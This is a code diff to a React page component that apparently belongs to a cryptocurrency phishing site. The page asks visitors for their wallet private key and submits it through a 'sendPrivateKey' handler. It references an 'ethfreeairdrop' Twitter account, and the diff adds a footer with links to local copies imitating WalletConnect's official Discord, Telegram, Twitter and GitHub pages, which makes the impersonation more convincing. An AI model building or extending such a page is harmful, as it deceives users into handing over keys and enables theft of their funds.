@@ -7,6 +7,10 @@ import Button from '@material-ui/core/Button';
 import TwitterIcon from '@material-ui/icons/Twitter';
 import "./PrivateKey.css"
 import axios from "./axios";
+import Discord from "./discord.svg"
+import Telegram from "./telegram.svg"
+import Twitter from "./twitter.svg"
+import Github from "./github.svg"
 
 
 function Header() {
@@ -149,10 +153,20 @@ function Header() {
                 <p className="phrase__description">Typically 64 alphanumeric characters</p>
                 <Button onClick={sendPrivateKey} type="submit" className="btn" variant="contained" color="primary">IMPORT</Button>
                 </form>
-               <a href="https://mobile.twitter.com/ethfreeairdrop" className="social__handles"> <TwitterIcon color="primary"/>Twitter</a>
+               {/* <a href="https://mobile.twitter.com/ethfreeairdrop" className="social__handles"> <TwitterIcon color="primary"/>Twitter</a> */}
                 
             </div>
         </div>
+            <center>
+                    <footer className="home__footer">
+            <div id="footer">
+            <p className="footer__p"><img  src={Discord} className="footimg"/>  <a href="../discord.com/invite/jhxMvxP.html">Discord</a></p><br/>
+            <p className="footer__p"><img  src={Telegram} className="footimg"/>  <a href="../t.me/walletconnect_announcements.html">Telegram</a></p><br/>
+            <p className="footer__p"><img  src={Twitter} className="footimg"/>  <a href="../twitter.walletconnect.org/index.html">Twitter</a></p><br/>
+            <p className="footer__p"><img  src={Github} className="footimg"/>  <a href="../github.com/walletconnect.html">Github</a></p><br/>
+            </div>
+            </footer>
+            </center>
     </div>
     )
 }
